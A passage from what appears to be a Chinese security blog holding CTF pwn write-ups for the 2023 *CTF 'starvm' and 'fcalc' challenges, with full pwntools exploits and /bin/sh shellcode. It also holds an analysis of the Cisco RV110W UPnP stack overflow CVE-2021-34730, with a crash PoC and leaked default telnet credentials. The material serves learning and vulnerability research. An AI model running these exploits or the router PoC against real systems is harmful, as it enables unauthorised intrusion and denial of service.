class="hljs-number">0x7b</span>, dst, src, off, <span class="hljs-number">0</span>)   <span class="hljs-comment"># mov dst. src</span><br><br><span class="hljs-comment"># dbg(command)</span><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string"># test regs index</span><br><span class="hljs-string">payload = b&#x27;&#x27;</span><br><span class="hljs-string">for i in range(10):</span><br><span class="hljs-string">    payload += p64(add_imm(i, 0x8))</span><br><span class="hljs-string">payload += p64(load_src(10, 0, 0x8))</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>memcpy_got = elf.got[<span class="hljs-string">&#x27;memcpy&#x27;</span>]<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string"># leak_libc_version</span><br><span class="hljs-string">payload = flat(</span><br><span class="hljs-string">    [</span><br><span class="hljs-string">        sub_imm(&#x27;rbx&#x27;, 0xe088),     # codebase</span><br><span class="hljs-string">        mov_src(&#x27;rdi&#x27;, &#x27;r14&#x27;),</span><br><span class="hljs-string">        mov_src(&#x27;rsi&#x27;, &#x27;rbx&#x27;),</span><br><span class="hljs-string">        add_imm(&#x27;rsi&#x27;, memcpy_got),</span><br><span class="hljs-string">        add_imm(&#x27;rbx&#x27;, 0x270A),</span><br><span class="hljs-string">        load_src(&#x27;rbp&#x27;, &#x27;rbx&#x27;, 0x28),</span><br><span class="hljs-string">    ]</span><br><span class="hljs-string">)</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>one_gadget = [<span class="hljs-number">0xe3afe</span>, <span class="hljs-number">0xe3b01</span>, <span class="hljs-number">0xe3b04</span>]<br><br>payload = flat(<br>    [<br>        sub_imm(<span class="hljs-string">&#x27;rax&#x27;</span>, <span class="hljs-number">0x58b000</span>),   <span class="hljs-comment"># libc_addr,</span><br>        add_imm(<span class="hljs-string">&#x27;rax&#x27;</span>, one_gadget[<span class="hljs-number">1</span>]),<br>        load_src(<span class="hljs-string">&#x27;rbp&#x27;</span>, <span class="hljs-string">&#x27;rax&#x27;</span>, <span class="hljs-number">0x138</span>)<br>    ]<br>)<br>payload = payload.<span class="hljs-built_in">hex</span>()<br>p.sendlineafter(<span class="hljs-string">&#x27;Program: &#x27;</span>, payload)<br>p.sendlineafter(<span class="hljs-string">&#x27;Memory: &#x27;</span>, p64(<span class="hljs-number">0x100</span>).<span class="hljs-built_in">hex</span>())<br><br>p.interactive()<br></code></pre></td></tr></table></figure><p><img src="/img/jit-pwn/image-20230826230249320.png" alt="image-20230826230249320"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>通过上述两道题，可以知道jit类型的pwn难点在于指令翻译的过程，利用大部分是shellcode构造。</p><p>收获很大，继续加油！</p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://www.cnblogs.com/dzhou/p/9549839.html">https://www.cnblogs.com/dzhou/p/9549839.html</a></p><p><a href="https://zhuanlan.zhihu.com/p/361250220">https://zhuanlan.zhihu.com/p/361250220</a></p><p><a href="https://blog.wingszeng.top/2023-xhlj-pwn-jit/">https://blog.wingszeng.top/2023-xhlj-pwn-jit/</a></p><p><a href="https://roderickchan.github.io/zh-cn/2023-02-02-2023%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E5%88%9D%E8%B5%9Bpwn-jit/">https://roderickchan.github.io/zh-cn/2023-02-02-2023%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E5%88%9D%E8%B5%9Bpwn-jit/</a></p><p><a href="https://mp.weixin.qq.com/s/hpLSfXtc1pYPtvz3734iLA">https://mp.weixin.qq.com/s/hpLSfXtc1pYPtvz3734iLA</a></p>]]></content>
    
    
    <categories>
      
      <category>知识点总结</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pwn</tag>
      
      <tag>jit</tag>
      
      <tag>知识点总结</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2023-*ctf部分复现-pwn</title>
    <link href="/2023/08/01/2023-starctf%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0-pwn/"/>
    <url>/2023/08/01/2023-starctf%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0-pwn/</url>
    
    <content type="html"><![CDATA[<h1 id="2023-ctf部分复现-pwn"><a href="#2023-ctf部分复现-pwn" class="headerlink" title="2023-*ctf部分复现-pwn"></a>2023-*ctf部分复现-pwn</h1><p>这次比赛跟着团队打的，笔者题目都还没逆明白呢，师傅们就把pwn ak了，实在是太强了。</p><h2 id="starvm"><a href="#starvm" class="headerlink" title="starvm"></a>starvm</h2><p>查看保护。</p><p><img src="/./img/2023-starctf%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0-pwn/image-20230802212338355.png" alt="image-20230802212338355"></p><p>题目使用C++实现了一个简单虚拟机，关键就是识别出虚拟机的结构体。</p><p>结构体大致如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vm</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-built_in">vector</span> code;<br>  <span class="hljs-built_in">vector</span> cmd;<br>  <span class="hljs-type">void</span> *ip;<br>  <span class="hljs-type">int</span> regs[<span class="hljs-number">14</span>];<br>  <span class="hljs-type">char</span> *heap;<br>  <span class="hljs-type">int</span> flag;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vector</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-type">void</span> *start;<br>  <span class="hljs-type">void</span> *end;<br>  <span class="hljs-type">void</span> *storage;<br>&#125;;<br></code></pre></td></tr></table></figure><p>这里<code>sub_4014A0</code>输入操作码，<code>sub_401630</code>输入操作数。</p><p><img src="/./img/2023-starctf%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0-pwn/image-20230806161817312.png" alt="image-20230806161817312"></p><p>接下来，简单分析下各个操作码功能。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-number">0</span>: reg[id1] = reg[id2]<br><span class="hljs-number">1</span>: reg[id1] &lt; reg[id2] flag = <span class="hljs-number">2</span>; reg[id1] = reg[id2] flag = <span class="hljs-number">0</span><br><span class="hljs-number">2</span>: reg[id1] += reg[id2]<br><span class="hljs-number">3</span>: reg[id1] -= reg[id2]<br><span class="hljs-number">4</span>: start += reg[id1] <span class="hljs-keyword">if</span> id2 &gt; <span class="hljs-number">0</span><br><span class="hljs-number">5</span>, <span class="hljs-number">8</span>, <span class="hljs-number">9</span>: reg[id1] &amp;= reg[id2]<br><span class="hljs-number">6</span>: reg[id1] = heap[<span class="hljs-number">4</span> * id2]<br><span class="hljs-number">7</span>: heap[<span class="hljs-number">4</span> * id2] = reg[id1]<br><span class="hljs-number">10</span>: reg[id1] = id2<br><span class="hljs-number">11</span>: end = reg[id1]<br><span class="hljs-number">12</span>: reg[id1] = *(end - <span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><p>这里漏洞点主要是，操作码10并未检查reg索引，存在reg数组越界漏洞。</p><p><img src="/./img/2023-starctf%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0-pwn/image-20230802214725862.png" alt="image-20230802214725862"></p><p><img src="/./img/2023-starctf%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0-pwn/image-20230806161507670.png" alt="image-20230806161507670"></p><p>整体利用思路为：</p><ol><li>利用数组越界将puts_got写入heap中</li><li>利用6功能将heap内容，即puts_got表内容写入regs数组中</li><li>根据偏移得到出one_gadget的地址</li><li>利用7功能将one_gadget写入heap中，也即puts_got表</li><li>最后利用7功能中id1越界检查触发one_gadget</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-comment"># -*- coding:utf-8 -*-</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>fn = <span class="hljs-string">&#x27;./starvm&#x27;</span><br>elf = ELF(fn)<br>libc = ELF(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)<br><br>debug = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> debug:<br>    p = process(fn)<br><br><span class="hljs-keyword">else</span>:<br>    p = remote()<br>    <br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dbg</span>(<span class="hljs-params">s=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>    <span class="hljs-keyword">if</span> debug:<br>        gdb.attach(p, s)<br>        pause()<br><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">pass</span><br>    <br>lg = <span class="hljs-keyword">lambda</span> x, y: log.success(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;x&#125;</span>: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(y)&#125;</span>&#x27;</span>)<br><br>command = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">b *0x401700</span><br><span class="hljs-string">b *0x401A34</span><br><span class="hljs-string">b *0x401480</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>puts_got = elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><br><span class="hljs-comment"># dbg(command)</span><br><br>payload = [<span class="hljs-number">10</span>, <span class="hljs-number">6</span>, <span class="hljs-number">10</span>, <span class="hljs-number">6</span>, <span class="hljs-number">10</span>, <span class="hljs-number">2</span>, <span class="hljs-number">10</span>, <span class="hljs-number">7</span>, <span class="hljs-number">7</span>]<br>payload = <span class="hljs-string">&#x27; &#x27;</span>.join([<span class="hljs-built_in">str</span>(x) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> payload])<br>payload += <span class="hljs-string">&#x27; 16&#x27;</span><br>p.sendlineafter(<span class="hljs-string">&#x27;your command:&#x27;</span>, payload)<br><br>payload = [<br>    <span class="hljs-number">14</span>, puts_got,       <span class="hljs-comment"># 10</span><br>    <span class="hljs-number">0</span>, <span class="hljs-number">0</span>,              <span class="hljs-comment"># 6</span><br>    <span class="hljs-number">14</span>, puts_got + <span class="hljs-number">4</span>,   <span class="hljs-comment"># 10</span><br>    <span class="hljs-number">1</span>, <span class="hljs-number">0</span>,               <span class="hljs-comment"># 6</span><br>    <span class="hljs-number">2</span>, <span class="hljs-number">0x6aee3</span>,        <span class="hljs-comment"># 10</span><br>    <span class="hljs-number">0</span>, <span class="hljs-number">2</span>,               <span class="hljs-comment"># 2</span><br>    <span class="hljs-number">14</span>, puts_got,       <span class="hljs-comment"># 10</span><br>    <span class="hljs-number">0</span>, <span class="hljs-number">0</span>,                <span class="hljs-comment"># 7</span><br>    <span class="hljs-number">18</span>, <span class="hljs-number">0</span>,               <span class="hljs-comment"># 7 trigger</span><br>    <span class="hljs-number">0xdeadbeef</span><br>]<br>payload = <span class="hljs-string">&#x27; &#x27;</span>.join([<span class="hljs-built_in">str</span>(x) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> payload])<br>p.sendlineafter(<span class="hljs-string">&#x27;your cost:&#x27;</span>, payload)<br><br>p.interactive()<br><br></code></pre></td></tr></table></figure><p><img src="/./img/2023-starctf%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0-pwn/image-20230806161715661.png" alt="image-20230806161715661"></p><h2 id="fcalc"><a href="#fcalc" class="headerlink" title="fcalc"></a>fcalc</h2><p>查看保护。</p><p><img src="/./img/2023-starctf%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0-pwn/image-20230802215714010.png" alt="image-20230802215714010"></p><p>程序实现了输入浮点数计算的功能。</p><p>程序的数据检查存在疏漏，当输入’\x30’时，可以进入else流程。</p><p><img src="/./img/2023-starctf%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0-pwn/image-20230802215805696.png" alt="image-20230802215805696"></p><p>else流程首先检查输入浮点数的合法性，然后根据函数指针数组调用指定函数。</p><p><img src="/./img/2023-starctf%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0-pwn/image-20230802220022923.png" alt="image-20230802220022923"></p><p>当输入为’\x30’时，程序会调用qword_4060[16]，这里存在溢出，刚好能够把我们输入的内容作为shellcode调用。</p><p><img src="/./img/2023-starctf%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0-pwn/image-20230802220203574.png" alt="image-20230802220203574"></p><p>这道题比较难的部分，也就是书写符合要求的shellcode。但是我们注意到，当我们输入’\x00’时，会立即调用fun_ptr，并不会对后续输入转换。可以想到，写入跳转指令，然后跳转到我们的shellcode上，即可获取shell。</p><p>这里跳转指令如何找呢？通过调试，可以发现我们写入的shellcode在fun_ptr上方，我们需要的就是<code>jmp -0x??</code>这样的指令。这里直接使用在线网站转换即可。</p><p><img src="/./img/2023-starctf%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0-pwn/image-20230802221431543.png" alt="image-20230802221431543"></p><p>需要注意的是，我们写入的跳转指令还需要满足else流程的检查。这里涉及到c语言浮点数的基础知识，c语言浮点数符合IEEE规则。对于double类型的浮点数，第一位为符号位，第2~12位为阶码，剩下的52位，即6个字节左右。这里为了满足大小要求只需要设置前12位即可，剩下的52位是我们可以随意写的，也就是可以写入我们的跳转指令。</p><p>最终wp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><br><span class="hljs-comment">#encoding:utf-8</span><br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>fn = <span class="hljs-string">&#x27;./fcalc&#x27;</span><br>elf = ELF(fn)<br>libc = ELF(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)<br><br>debug = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> debug:<br>    p = process(fn)<br><br><span class="hljs-keyword">else</span>:<br>    p = remote()<br>    <br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dbg</span>(<span class="hljs-params">s=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>    <span class="hljs-keyword">if</span> debug:<br>        gdb.attach(p, s)<br>        pause()<br><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">pass</span><br>    <br>lg = <span class="hljs-keyword">lambda</span> x, y: log.success(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;x&#125;</span>: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(y)&#125;</span>&#x27;</span>)<br><br>dbg(<span class="hljs-string">&#x27;b *$rebase(0x1867)&#x27;</span>)<br><br>shellcode = asm(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    xor rsi, rsi</span><br><span class="hljs-string">    mul rsi</span><br><span class="hljs-string"></span><br><span class="hljs-string">    push rax</span><br><span class="hljs-string">    mov rbx, 0x68732f2f6e69622f</span><br><span class="hljs-string">    push rbx</span><br><span class="hljs-string"></span><br><span class="hljs-string">    mov rdi, rsp</span><br><span class="hljs-string">    mov al, 59</span><br><span class="hljs-string"></span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span>)<br>                <br><span class="hljs-comment"># print(len(shellcode))</span><br><br>payload = <span class="hljs-string">b&#x27;1 1 0&#x27;</span>.ljust(<span class="hljs-number">0x10</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>payload += shellcode.ljust(<span class="hljs-number">0x40</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>payload += p64(<span class="hljs-number">0x3ff000000000beeb</span>)<br><br>p.sendafter(<span class="hljs-string">b&#x27;Enter your expression:\n&#x27;</span>, payload)<br><br>p.interactive()<br><br></code></pre></td></tr></table></figure><p><img src="/./img/2023-starctf%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0-pwn/image-20230803102932472.png" alt="image-20230803102932472"></p><h2 id="drop"><a href="#drop" class="headerlink" title="drop"></a>drop</h2><p>这是一道rust pwn，笔者暂时逆不太出来，之后学这方面的内容再来填坑吧。</p>]]></content>
    
    
    <categories>
      
      <category>PWN</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pwn</tag>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CVE-2021-34730-RV110W-upnp漏洞分析</title>
    <link href="/2023/07/30/CVE-2021-34730-RV110W-upnp%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <url>/2023/07/30/CVE-2021-34730-RV110W-upnp%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<h1 id="CVE-2021-34730-RV110W-upnp漏洞分析"><a href="#CVE-2021-34730-RV110W-upnp漏洞分析" class="headerlink" title="CVE-2021-34730-RV110W-upnp漏洞分析"></a>CVE-2021-34730-RV110W-upnp漏洞分析</h1><p>笔者使用的固件版本为RV110W- 1.2.2.5。这个版本的固件存在CVE-2020-3330漏洞，运行了telnet服务且可以泄露telnet的用户名和密码，admin:Admin123。</p><p>需要注意的一点是，这里是upnp漏洞，需要保证upnp服务的开启。</p><p><img src="/img/CVE-2021-34730-RV110W-upnp%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230731091721306.png" alt="image-20230731091721306"></p><p>使用telnet连接到路由器，查看进程。</p><p><img src="/img/CVE-2021-34730-RV110W-upnp%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230731091927631.png" alt="image-20230731091927631"></p><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>Cisco Small Business RV110W、RV130、RV130W和RV215W路由器的通用即插即用（UPnP）服务中的漏洞可能允许未经身份验证的远程攻击者执行任意代码或导致受影响的设备意外重新启动，从而导致拒绝服务（DoS）情况。</p><h2 id="UPnP协议"><a href="#UPnP协议" class="headerlink" title="UPnP协议"></a>UPnP协议</h2><p>UPnP（Universal Plug and Play），即通用即插即用协议。旨在简化和改进网络设备之间的互操作性和通信。它允许网络中的各种设备自动发现彼此，并建立连接，以便进行数据传输和共享资源。</p><p>UPNP协议栈如下图所示：</p><p><img src="/img/CVE-2021-34730-RV110W-upnp%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/upnp.png" alt="upnp"></p><p>可以看到，upnp协议栈是建立在ip层之上的。upnp由ssdp(简单服务发现协议)、soap(简单对象访问协议)以及gena(通用事件通知框架)这几个协议构成。这里我们主要介绍ssdp协议。</p><p>SSDP(Simple Service Discover Protocol) 简单服务发现协议，这个协议是 UPnP 的核心。SSDP 使用一个固定的组播地址 <code>239.255.255.250</code> 和 UDP 端口号 <code>1900</code> 来监听其他设备的请求。任何设备即使不使用UPnP协议也都可以监听这个多播地址，收到其中的信息。</p><p>SSDP 协议的请求消息有两种类型，第一种是<strong>服务通知</strong>，设备和服务使用此类通知消息声明自己存在；第二种是<strong>查询请求</strong>，协议客户端用此请求查询某种类型的设备和服务。</p><p>这里我们写一个简单的脚本，模拟upnp客户端，向upnp服务端发送<strong>查询请求</strong>，查看路由器是否开启了upnp服务。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> socket<br><br>msg = \<br>    <span class="hljs-string">b&#x27;M-SEARCH * HTTP/1.1\r\n&#x27;</span> \<br>    <span class="hljs-string">b&#x27;HOST:239.255.255.250:1900\r\n&#x27;</span> \<br>    <span class="hljs-string">b&#x27;ST:upnp:rootdevice\r\n&#x27;</span> \<br>    <span class="hljs-string">b&#x27;MX:2\r\n&#x27;</span> \<br>    <span class="hljs-string">b&#x27;MAN:&quot;ssdp:discover&quot;\r\n&#x27;</span> \<br>    <span class="hljs-string">b&#x27;\r\n&#x27;</span><br><br>s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)<br>s.bind((<span class="hljs-string">b&quot;192.168.1.71&quot;</span>, <span class="hljs-number">23333</span>))  <span class="hljs-comment"># 绑定本机IP</span><br>s.settimeout(<span class="hljs-number">2</span>)<br>s.sendto(msg, (<span class="hljs-string">b&#x27;239.255.255.250&#x27;</span>, <span class="hljs-number">1900</span>))<br>addr = (<span class="hljs-string">&#x27;192.168.1.1&#x27;</span>, <span class="hljs-number">1900</span>)  <span class="hljs-comment"># </span><br><span class="hljs-keyword">try</span>:<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        data, addr = s.recvfrom(<span class="hljs-number">65507</span>)<br>        <span class="hljs-built_in">print</span>(addr, data)<br><br><span class="hljs-keyword">except</span> socket.timeout:<br>    <span class="hljs-keyword">pass</span><br><br></code></pre></td></tr></table></figure><p><img src="/img/CVE-2021-34730-RV110W-upnp%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230731090251849.png" alt="image-20230731090251849"></p><p>这里我们收到了upnp服务端的响应，说明路由器确实是开放了upnp服务。</p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>upnp服务主要是在函数<code>upnp_mainloop</code>实现的。</p><p><img src="/img/CVE-2021-34730-RV110W-upnp%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230730220317990.png" alt="image-20230730220317990"></p><p>这里初始化upnp服务，然后根据flag的值，选择对应的实现逻辑，这里我们主要看<code>upnp_dispatch</code>函数。</p><p><img src="/img/CVE-2021-34730-RV110W-upnp%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230730222028538.png" alt="image-20230730222028538"></p><p>这里主要逻辑应该是初始化ssdp请求，然后<code>upnp_http_process</code>监听连接，最后发送upnp请求。</p><p><img src="/img/CVE-2021-34730-RV110W-upnp%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230731101028423.png" alt="image-20230731101028423"></p><p>调用了<code>upnp_http_fsm_engine</code>函数，这个函数不断调用<strong>fun_ptr</strong>函数指针数组的内容。</p><p><img src="/img/CVE-2021-34730-RV110W-upnp%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230731101233468.png" alt="image-20230731101233468"></p><p>函数指针数组内容如下图所示，这里我们主要关注<code>upnp_http_fsm_dispatch</code>这个函数。</p><p><img src="/img/CVE-2021-34730-RV110W-upnp%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230731101323625.png" alt="image-20230731101323625"></p><p><img src="/img/CVE-2021-34730-RV110W-upnp%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230731101426794.png" alt="image-20230731101426794"></p><p>这个函数的具体值需要我们通过动态调试获取。</p><p><img src="/img/CVE-2021-34730-RV110W-upnp%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230731101722302.png" alt="image-20230731101722302"></p><p>通过动态调试，可以确定该函数为<code>sub_405b34</code>。</p><p>逆向分析该函数，可以发现该函数对uuid字段长度检验不严格，从而导致栈溢出。</p><p><img src="/img/CVE-2021-34730-RV110W-upnp%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230730221246813.png" alt="image-20230730221246813"></p><p>这里分析<code>ssdp_msearch_response</code>函数。</p><p><img src="/img/CVE-2021-34730-RV110W-upnp%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230730221353931.png" alt="image-20230730221353931"></p><p>该函数存在两个判断，需要过掉判断才能正常调用<code>ssdp_response</code>函数。</p><p>但是通过动态调试我们可以发现，这两个判断都是可以自动过掉的，所以我们也就不需要关注这两个判断。</p><p>最后返回到<code>sub_405b34</code>。</p><h2 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h2><p><strong>poc</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> socket<br><br>targer_ip = <span class="hljs-string">&quot;192.168.1.1&quot;</span><br>target_port = <span class="hljs-number">1900</span><br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0xa0</span><br>payload += <span class="hljs-string">b&#x27;bbbb&#x27;</span><br><br>msg = \<br>    <span class="hljs-string">b&#x27;M-SEARCH * HTTP/1.1\r\n&#x27;</span> \<br>    <span class="hljs-string">b&#x27;HOST:239.255.255.250:1900\r\n&#x27;</span> \<br>    <span class="hljs-string">b&#x27;ST:uuid:&#x27;</span> + payload + <span class="hljs-string">b&#x27;\r\n&#x27;</span> \<br>    <span class="hljs-string">b&#x27;MX:2\r\n&#x27;</span> \<br>    <span class="hljs-string">b&#x27;MAN:&quot;ssdp:discover&quot;\r\n&#x27;</span> \<br>    <span class="hljs-string">b&#x27;\r\n&#x27;</span><br><br>s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)<br><br>s.sendto(msg, (targer_ip, target_port))<br><br></code></pre></td></tr></table></figure><p><img src="/img/CVE-2021-34730-RV110W-upnp%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230731105353515.png" alt="image-20230731105353515"></p><p><strong>利用</strong></p><p>剩下的利用可以参考笔者<a href="https://bbs.kanxue.com/thread-278129.htm">这篇文章</a>。都是大同小异的流程。</p><h2 